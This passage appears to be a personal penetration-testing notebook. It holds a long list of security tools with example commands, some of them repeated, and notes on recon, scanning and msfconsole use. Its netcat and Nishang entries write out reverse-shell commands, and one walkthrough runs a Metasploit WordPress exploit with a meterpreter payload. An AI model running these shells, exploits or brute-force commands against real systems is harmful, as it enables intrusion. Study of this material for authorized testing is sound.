## 28. Unicornscan
Description: Advanced, user-friendly network scanning tool.
Example: unicornscan example.com

## 29. Nessus
Description: Vulnerability scanner.
Example: nessus

## 30. OpenVAS
Description: Open-source vulnerability scanner.
Example: openvas-start

## 31. Burp Suite
Description: Integrated platform for performing security testing of web applications.
Example: burpsuite

## 32. John the Ripper
Description: Password cracker.
Example: john --wordlist=password.lst hashes.txt

## 33. Hydra
Description: Network logon cracker.
Example: hydra -l user -P passlist.txt example.com ssh

## 34. Medusa
Description: Speedy, parallel, and modular brute-force log-in tool.
Example: medusa -h example.com -u user -P passlist.txt -M ssh

## 35. SQLmap
Description: Automatic SQL injection and database takeover tool.
Example: sqlmap -u "http://example.com/vulnerable?param=value"

## 36. XSStrike
Description: Advanced XSS detection suite.
Example: xsstrike -u http://example.com

## 37. Nikto2
Description: Web server scanner.
Example: nikto -h http://example.com

## 38. Httrack
Description: Website copier.
Example: httrack http://example.com

## 39. Dnsrecon
Description: DNS reconnaissance tool.
Example: dnsrecon -d example.com

## 40. Ettercap
Description: Comprehensive suite for man-in-the-middle attacks.
Example: ettercap -G

## 41. Armitage
Description: GUI for Metasploit.
Example: armitage

## 42. Responder
Description: LLMNR, NBT-NS, and MDNS poisoner.
Example: responder -I eth0

## 43. SET
Description: Social Engineering Toolkit.
Example: setoolkit

## 44. BeEF
Description: Browser Exploitation Framework.
Example: beef

## 45. Yersinia
Description: Network protocol attacks.
Example: yersinia -G

## 46. Lynis
Description: Security auditing tool for UNIX-based systems.
Example: lynis audit system

## 47. Ncat
Description: Feature-packed networking utility.
Example: ncat -lvp 1234

## 48. Driftnet
Description: Capture images from network traffic.
Example: driftnet -i eth0

## 49. Tcpdump
Description: Packet analyzer.
Example: tcpdump -i eth0

## 50. Bro (Zeek)
Description: Network analysis framework.
Example: zeek -r traffic.pcap

## 51. Mimikatz
Description: Credential dumping tool.
Example: mimikatz

## 52. Empire
Description: Post-exploitation framework.
Example: empire

## 53. Snort
Description: Network intrusion detection system.
Example: snort -A console -i eth0 -c /etc/snort/snort.conf

## 54. Suricata
Description: Network threat detection engine.
Example: suricata -c /etc/suricata/suricata.yaml -i eth0

## 55. ClamAV
Description: Antivirus engine.
Example: clamscan -r /path/to/directory

## 56. OpenSCAP
Description: Compliance checking tool.
Example: oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_standard /path/to/xccdf.xml

## 57. Lsof
Description: List open files.
Example: lsof -i

## 58. Tcpflow
Description: Network data capturing tool.
Example: tcpflow -i eth0

## 59. Tcpreplay
Description: Replay captured network traffic.
Example: tcpreplay -i eth0 capture.pcap

## 60. hping3
Description: Network tool for sending custom TCP/IP packets.
Example: hping3 -S example.com -p 80 -c 100

## 61. IPTables
Description: Linux firewall.
Example: iptables -A INPUT -p tcp --dport 22 -j ACCEPT

## 62. Fail2ban
Description: Intrusion prevention software framework.
Example: fail2ban-client status

## 63. Rkhunter
Description: Rootkit hunter.
Example: rkhunter --check

## 64. Chkrootkit
Description: Rootkit checker.
Example: chkrootkit

## 65. AIDE
Description: Advanced Intrusion Detection Environment.
Example: aide --check

## 66. OSSEC
Description: Open source host-based intrusion detection system.
Example: ossec-control start

## 67. Lynis
Description: Security auditing tool.
Example: lynis audit system

## 68. Ndiff
Description: Network scan comparison utility.
Example: ndiff scan1.xml scan2.xml

## 69. P0f
Description: Passive OS fingerprinting tool.
Example: p0f -i eth0

## 70. sFlowTool
Description: sFlow toolkit.
Example: sflowtool -r capture.sflow

## 71. Flow-tools
Description: Flow capture and processing tools.
Example: flow-cat /path/to/flowfiles | flow-print

## 72. P0wny
Description: Shell.
Example: p0wny

## 73. Pwncat
Description: Post-exploitation tool.
Example: pwncat -lp 4444

## 74. Patator
Description: Multi-purpose brute-forcer.
Example: patator ftp_login host=example.com user=FILE0 0=/path/to/userlist.txt password=FILE1 1=/path/to/passlist.txt

## 75. Weevely
Description: Web shell.
Example: weevely generate password /path/to/webshell.php

## 76. Pupy
Description: Cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool.
Example: pupysh

## 77. Empire
Description: PowerShell and Python post-exploitation agent.
Example: ./empire

## 78. RedSnarf
Description: Pen-testing/Red-teaming tool.
Example: reds

## 79. Shellter
Description: Dynamic shellcode injection tool.
Example: shellter

## 80. Commix
Description: Command injection and exploitation tool.
Example: commix --url=http://example.com

## 81. sqlninja
Description: Exploiting SQL Injection vulnerabilities on web applications.
Example: sqlninja -u http://example.com/vuln.php?id=1

## 82. Sqlsus
Description: SQL injection and takeover tool.
Example: sqlsus -u http://example.com/vuln.php?id=1

## 83. Tshark
Description: Terminal-based network protocol analyzer.
Example: tshark -i eth0

## 84. Bettercap
Description: Modular, portable and easily extensible MITM framework.
Example: bettercap -X

## 85. SIPVicious
Description: Audit SIP-based VoIP systems.
Example: svmap example.com

## 86. Bed
Description: Bruteforce Exploit Detector.
Example: bed -l -d example.com

## 87. Dnswalk
Description: DNS debugger.
Example: dnswalk example.com

## 88. Fpdns
Description: Fingerprinting DNS servers.
Example: fpdns example.com

## 89. Hping2
Description: Network scanning and testing tool.
Example: hping2 -S example.com -p 80

## 90. THC-IPv6
Description: Attack toolkit for the IPv6 protocol.
Example: thc-ipv6-setup.sh

## 91. IRPAS
Description: Routing protocol attack suite.
Example: irpass

## 92. Yara
Description: Pattern matching tool for malware identification.
Example: yara -r rule.yar /path/to/scan

## 93. ExifTool
Description: Metadata analyzer.
Example: exiftool /path/to/file

## 94. Binwalk
Description: Firmware analysis tool.
Example: binwalk /path/to/firmware.bin

## 95. Foremost
Description: File recovery tool.
Example: foremost -i /path/to/diskimage

## 96. Scalpel
Description: File carving tool.
Example: scalpel /path/to/diskimage

## 97. Autopsy
Description: Digital forensics platform.
Example: autopsy

## 98. Volatility
Description: Memory forensics framework.
Example: volatility -f /path/to/memory.dmp --profile=Win7SP1x64 pslist

## 99. RedSnarf
Description: Pen-testing/Red-teaming tool.
Example: reds

## 100. Shellter
Description: Dynamic shellcode injection tool.
Example: shellter

## 101. PowerSploit
Description: PowerShell Post-Exploitation Framework.
Example: powershell -exec bypass

## 102. Responder
Description: LLMNR, NBT-NS, and MDNS poisoner.
Example: responder -I eth0

## 103. ysoserial
Description: Deserialization payloads generator for various libraries.
Example: java -jar ysoserial.jar CommonsCollections1 'touch /tmp/ysoserial'

## 104. DNSChef
Description: DNS proxy for creating custom DNS server.
Example: dnschef --fakeip 192.168.1.1

## 105. THC Hydra
Description: Online password cracking tool.
Example: hydra -l username -P /path/to/passwords.txt ssh://example.com

## 106. Patator
Description: Multi-purpose brute-forcer.
Example: patator ssh_login host=example.com user=FILE0 0=/path/to/userlist.txt password=FILE1 1=/path/to/passlist.txt

## 107. Sn1per
Description: Automated scanner that can be used during a penetration test.
Example: sn1per

## 108. Yersinia
Description: Network protocols testing and exploiting tool.
Example: yersinia -G

## 109. THC-SSL-DOS
Description: Stress testing tool for websites.
Example: thc-ssl-dos example.com 443 5

## 110. Nishang
Description: Offensive PowerShell for red team, penetration testing, and offensive security.
Example: powershell -nop -exec bypass -c "Import-Module .\Nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.1 -Port 4444"

## 111. DAVTest
Description: WebDAV testing tool.
Example: davtest -url http://example.com

## 112. SQLMap
Description: Automatic SQL injection and database takeover tool.
Example: sqlmap -u "http://example.com/vulnerable?param=value"

## 113. Burp Suite
Description: Integrated platform for performing security testing of web applications.
Example: burpsuite

## 114. DirBuster
Description: Directory brute force tool.
Example: dirbuster

## 115. Hydra
Description: Network logon cracker.
Example: hydra -l user -P passlist.txt example.com ssh

## 116. Medusa
Description: Speedy, parallel, and modular brute-force log-in tool.
Example: medusa -h example.com -u user -P passlist.txt -M ssh

## 117. Wpscan
Description: WordPress vulnerability scanner.
Example: wpscan --url http://example.com

## 118. Nikto
Description: Web server scanner.
Example: nikto -h http://example.com

## 119. Sublist3r
Description: Subdomains enumeration tool.
Example: sublist3r -d example.com

## 120. GoBuster
Description: Directory/file &amp; DNS busting tool.
Example: gobuster dir -u http://example.com -w wordlist.txt

## 121. The Fat Rat
Description: Easy tool for generating backdoor payloads.
Example: thefatrat

## 122. Social Engineer Toolkit (SET)
Description: Open-source penetration testing framework.
Example: setoolkit

## 123. BeEF (The Browser Exploitation Framework)
Description: Command and control server to create browser-based attacks.
Example: beef-xss

## 124. Veil-Framework
Description: Tool designed to generate metasploit payloads.
Example: veil

## 125. SQLMap
Description: Automatic SQL injection and database takeover tool.
Example: sqlmap -u "http://example.com/vulnerable?param=value"

## 126. EvilFOCA
Description: Network attack tool for ethernet bridges.
Example: evilfoca

## 127. XssPy
Description: Web application XSS scanner.
Example: xsspy -u http://example.com

## 128. RouterSploit
Description: Router exploitation framework.
Example: routersploit

## 129. SQLiX
Description: SQL injection scanner.
Example: sqlx -u http://example.com

## 130. XAttacker
Description: Website vulnerability scanner.
Example: python3 XAttacker.py

## 131. XRay
Description: Tool for recon, mapping, and OSINT gathering from public networks.
Example: xray

## 132. Wfuzz
Description: Web application password cracker.
Example: wfuzz -c -z file,/path/to/wordlist.txt --hc 404 http://example.com/FUZZ

## 133. Brutex
Description: Brute-force credentials (ssh, ftp, telnet, vnc and more).
Example: brutex -p 21 -s ftp.example.com -v -u admin -x 500

## 134. Routersploit
Description: Exploitation Framework for Embedded Devices.
Example: python3 rsf.py

## 135. Yara
Description: Pattern matching tool for malware identification.
Example: yara -r rule.yar /path/to/scan

## 136. Striker
Description: Offensive information and vulnerability scanner.
Example: striker

## 137. Traceroute
Description: Network diagnostic tool for tracing the path packets take.
Example: traceroute example.com

## 138. DNSenum
Description: DNS enumeration tool.
Example: dnsenum example.com

## 139. Netdiscover
Description: Network address discovering tool.
Example: netdiscover

## 140. Fping
Description: Scriptable ping program.
Example: fping -a -g 192.168.1.0/24

## 141. Dmitry
Description: Deepmagic information gathering tool.
Example: dmitry -winsep example.com

## 142. Dnsmap
Description: DNS mapping tool.
Example: dnsmap example.com

## 143. Masscan
Description: Fast port scanner.
Example: masscan -p0-65535 example.com

## 144. Unicornscan
Description: Advanced, user-friendly network scanning tool.
Example: unicornscan example.com

## 145. Nessus
Description: Vulnerability scanner.
Example: nessus

## 146. OpenVAS
Description: Open-source vulnerability scanner.
Example: openvas-start

## 147. Burp Suite
Description: Integrated platform for performing security testing of web applications.
Example: burpsuite

## 148. John the Ripper
Description: Password cracker.
Example: john --wordlist=password.lst hashes.txt

## 149. Hydra
Description: Network logon cracker.
Example: hydra -l user -P passlist.txt example.com ssh

## 150. Medusa
Description: Speedy, parallel, and modular brute-force log-in tool.
Example: medusa -h example.com -u user -P passlist.txt -M ssh
</rich_text>
    </node>
    <node name="Most used" unique_id="305" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="50" is_bold="0" foreground="" ts_creation="1718597538" ts_lastsave="1730247020">
      <rich_text scale="h1">Most used command for </rich_text>
      <rich_text scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Penetration</rich_text>
      <rich_text scale="h1"> or </rich_text>
      <rich_text scale="h1" foreground="#ffffbebe6f6f" weight="heavy">Pen-testing</rich_text>
      <rich_text>
</rich_text>
      <rich_text scale="h3">Searching for vulnerabilities</rich_text>
      <rich_text>
</rich_text>
      <node name="Quick View" unique_id="401" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1729189975" ts_lastsave="1729831359">
        <rich_text scale="h1" weight="heavy">• Sniff</rich_text>
        <rich_text>	----------------------------------------------------
ip a									...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
ifconfig -a								...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">
</rich_text>
        <rich_text>nmcli									...</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>
nbtscan -r &lt;URL/24&gt;						...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">
</rich_text>
        <rich_text>netdiscover -r &lt;URL/24&gt;					...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
arp										...					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>
arp-scan								...					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Trace</rich_text>
        <rich_text>	----------------------------------------------------
ping &lt;URL&gt;								...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
traceroute &lt;URL&gt;						...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• nc (netcat)</rich_text>
        <rich_text>	--------------------------------------------
nc -v &lt;URL&gt;								...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Scan (Basic)</rich_text>
        <rich_text>	----------------------------------------
nmap -A &lt;URL&gt;							...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
nikto -h &lt;url&gt; --port &lt;PORT&gt;			...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
curl --head &lt;IP:PORT&gt;					...					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>
whatweb &lt;IP:PORT&gt;						...					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Scan (Advance)</rich_text>
        <rich_text>	------------------------------------
enum4linux -a &lt;URL&gt;						...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">***</rich_text>
        <rich_text>
smbclient -L &lt;URL&gt; -p &lt;PORT&gt;			...					</rich_text>
        <rich_text foreground="#f9f9f0f06b6b" weight="heavy">**</rich_text>
        <rich_text>
wpscan (WordPress Scan)					...					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">***</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Scan (directory)</rich_text>
        <rich_text>	--------------------------------
ffuf -w &lt;dict&gt; -u &lt;url&gt;/FUZZ			...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
dirb &lt;url&gt; &lt;dict&gt; -o &lt;output&gt;			...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#dcdc8a8adddd" weight="heavy">dirbuster</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#dcdc8a8adddd">(GUI)</rich_text>
        <rich_text foreground="#9a9a99999696"> </rich_text>
        <rich_text>						...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
gobuster dir -u &lt;IP&gt; -w &lt;PATH&gt; 			...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Scan (exploits)</rich_text>
        <rich_text>	------------------------------------
searchsploit							...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
msconsole								...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• More</rich_text>
        <rich_text>	--------------------------------------------------------
</rich_text>
        <rich_text foreground="#dcdc8a8adddd" weight="heavy">owasp-zap</rich_text>
        <rich_text weight="heavy"> </rich_text>
        <rich_text foreground="#dcdc8a8adddd">(GUI)</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">			 </rich_text>
        <rich_text>				...	</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">				</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">
</rich_text>
        <rich_text foreground="#dcdc8a8adddd" weight="heavy">burpsuit</rich_text>
        <rich_text weight="heavy"> </rich_text>
        <rich_text foreground="#dcdc8a8adddd">(GUI)</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">							</rich_text>
        <rich_text>...</rich_text>
        <rich_text foreground="#ffffbebe6f6f" weight="heavy">					</rich_text>
        <rich_text foreground="#8f8ff0f0a4a4" weight="heavy">***</rich_text>
        <rich_text>
wapiti -u &lt;URL&gt;							...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>
rpcclient -U &lt;USER&gt; &lt;URL&gt; -p &lt;PORT&gt;		...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>
patator									...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>
sqlmap									...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>
archini									...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>
zenmap									...					</rich_text>
        <rich_text foreground="#f6f661615151" weight="heavy">*</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1" weight="heavy">• Others</rich_text>
        <rich_text>	----------------------------------------------------
Wappalyzer (Browser Plugin)</rich_text>
      </node>
      <node name="Commands" unique_id="170" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285666" ts_lastsave="1729196384">
        <rich_text scale="h1" weight="heavy">More Penetration Commands</rich_text>
        <rich_text> (Most Used)</rich_text>
        <node name="arachni" unique_id="241" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684530690" ts_lastsave="1694326232">
          <rich_text>Download Page:
</rich_text>
          <rich_text link="webs https://www.arachni-scanner.com/download/">https://www.arachni-scanner.com/download/</rich_text>
          <rich_text>

Linux Download link:
</rich_text>
          <rich_text link="webs https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream">https://objects.githubusercontent.com/github-production-release-asset-2e65be/861781/858de0ed-8b61-4bf0-a354-fa40fa590006?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230519%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230519T205347Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=ca5d22a8a5f560edbe65936446e078369b0ab29e9a49d7970bead40ad33e1dc5&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=861781&amp;response-content-disposition=attachment%3B%20filename%3Darachni-1.6.1.3-0.6.1.1-linux-x86_64.tar.gz&amp;response-content-type=application%2Foctet-stream</rich_text>
        </node>
        <node name="arp" unique_id="172" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285702" ts_lastsave="1694147890">
          <rich_text>Usage:
  arp [-vn]  [&lt;HW&gt;] [-i &lt;if&gt;] [-a] [&lt;hostname&gt;]             &lt;-Display ARP cache
  arp [-v]          [-i &lt;if&gt;] -d  &lt;host&gt; [pub]               &lt;-Delete ARP entry
  arp [-vnD] [&lt;HW&gt;] [-i &lt;if&gt;] -f  [&lt;filename&gt;]            &lt;-Add entry from file
  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -s  &lt;host&gt; &lt;hwaddr&gt; [temp]            &lt;-Add entry
  arp [-v]   [&lt;HW&gt;] [-i &lt;if&gt;] -Ds &lt;host&gt; &lt;if&gt; [netmask &lt;nm&gt;] pub          &lt;-''-

        -a                       display (all) hosts in alternative (BSD) style
        -e                       display (all) hosts in default (Linux) style

        -s, --set                set a new ARP entry
        -d, --delete             delete a specified entry

        -v, --verbose            be verbose

        -n, --numeric            don't resolve names
        -i, --device             specify network interface (e.g. eth0)
        -D, --use-device         read &lt;hwaddr&gt; from given device
        -A, -p, --protocol       specify protocol family
        -f, --file               read new entries from file or from /etc/ethers




Ex:
$ arp -va
$ arp -ve
$ arp -vn
$ arp -v -i &lt;&lt;eth0&gt;&gt;</rich_text>
        </node>
        <node name="arp-scan" unique_id="171" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285689" ts_lastsave="1694326235"/>
        <node name="dig" unique_id="203" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286089" ts_lastsave="1684286104"/>
        <node name="dirb" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285726" ts_lastsave="1684285731"/>
        <node name="dirbuster" unique_id="177" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285731" ts_lastsave="1684285738"/>
        <node name="dirsearch" unique_id="196" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285975" ts_lastsave="1684285975"/>
        <node name="enum4linux" unique_id="183" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285785" ts_lastsave="1684285801"/>
        <node name="fping" unique_id="211" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286205" ts_lastsave="1684286212"/>
        <node name="gobuster" unique_id="178" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285738" ts_lastsave="1684285753"/>
        <node name="hostname" unique_id="204" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286104" ts_lastsave="1684286514">
          <rich_text>hostname
hostnamectl</rich_text>
        </node>
        <node name="ifconfig" unique_id="191" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285877" ts_lastsave="1694323928">
          <rich_text>ifconfig -a
ifconfig wlan0 down; macchanger wlan0 -a; ifconfig wlan0 up;
</rich_text>
        </node>
        <node name="ip" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285885" ts_lastsave="1694595707">
          <rich_text foreground="#18b2b2">ip</rich_text>
          <rich_text> a .. address
</rich_text>
          <rich_text foreground="#18b2b2">ip</rich_text>
          <rich_text> netconf
</rich_text>
          <rich_text foreground="#18b2b2">ip</rich_text>
          <rich_text> link 
</rich_text>
          <rich_text foreground="#18b2b2">ip</rich_text>
          <rich_text> addrlabel
 
</rich_text>
          <node name="info" unique_id="281" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694595660" ts_lastsave="1694595781">
            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
            <rich_text> </rich_text>
            <rich_text foreground="#18b2b2">ip</rich_text>
            <rich_text> </rich_text>
            <rich_text foreground="#18b218">-h</rich_text>
            <rich_text>
Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }
       ip [ -force ] -batch filename

where  OBJECT := { address | addrlabel | amt | fou | help | ila | ioam | l2tp |
                   link | macsec | maddress | monitor | mptcp | mroute | mrule |
                   neighbor | neighbour | netconf | netns | nexthop | ntable |
                   ntbl | route | rule | sr | tap | tcpmetrics |
                   token | tunnel | tuntap | vrf | xfrm }
 
       OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |
                    -h[uman-readable] | -iec | -j[son] | -p[retty] |
                    -f[amily] { inet | inet6 | mpls | bridge | link } |
                    -4 | -6 | -M | -B | -0 |
                    -l[oops] { maximum-addr-flush-attempts } | -br[ief] |
                    -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |
                    -rc[vbuf] [size] | -n[etns] name | -N[umeric] | -a[ll] |



</rich_text>
            <rich_text foreground="#5454ff" weight="heavy">$</rich_text>
            <rich_text> </rich_text>
            <rich_text foreground="#18b2b2">whatis</rich_text>
            <rich_text> ip
ip (7)               - Linux IPv4 protocol implementation 
ip (8)               - show / manipulate routing, network devices, interfaces and tunnels
 </rich_text>
          </node>
        </node>
        <node name="macchanger" unique_id="199" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286013" ts_lastsave="1694324254">
          <rich_text>macchanger -s eth0  # -s --show
macchanger -a eth0  # another kind
macchanger -r eth0  # fully random</rich_text>
        </node>
        <node name="msfconsole" unique_id="194" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285913" ts_lastsave="1685347989">
          <rich_text>searchsploit &lt;ANYTHING&gt;

search &lt;ANYTHING&gt;

use &lt;X&gt;
set &lt;X&gt;

show options

set rhost &lt;IP&gt;
set rhosts &lt;IP&gt;

setg rhost &lt;IP&gt;
setg rhosts &lt;IP&gt;

show payload
set payload &lt;X&gt;


Example:
1. $ search revslider
2. $ use exploit/unix/webapp/wp_revslider_upload_execute
3. $ show options
4. $ set rhost 127.0.0.1/targetsiteurl.com
5. $ set targeturi /wordpress
6. $ set payload php/meterpreter/bind_tcp
7. $ show options
8. $ check
9. $ exploit (or -&gt; $ run)
</rich_text>
        </node>
        <node name="nbtscan" unique_id="215" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286439" ts_lastsave="1694573845">
          <rich_text>nbtscan 192.168.90.135/24
</rich_text>
        </node>
        <node name="ncrack" unique_id="213" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286332" ts_lastsave="1684286332"/>
        <node name="nessus" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285772" ts_lastsave="1684285776"/>
        <node name="netcat" unique_id="209" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286180" ts_lastsave="1686252765">
          <rich_text>Host Machine:
nc -lnv -s 192.168.90.129 -p 4444

Target Box:
bash -i &gt;&amp; /dev/tcp/192.168.56.1/4444 0&gt;&amp;1

or use nc again
nc 192.168.90.128 4444 -e /bin/bash</rich_text>
        </node>
        <node name="netdiscover" unique_id="179" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285753" ts_lastsave="1684285767"/>
        <node name="netstat" unique_id="207" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684286149" ts_lastsave="1684286166"/>
        <node name="nikto" unique_id="175" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285721" ts_lastsave="1694326313">
          <rich_text>nikto -h 192.168.31.1</rich_text>
        </node>
        <node name="nmap" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285717" ts_lastsave="1696639005"/>
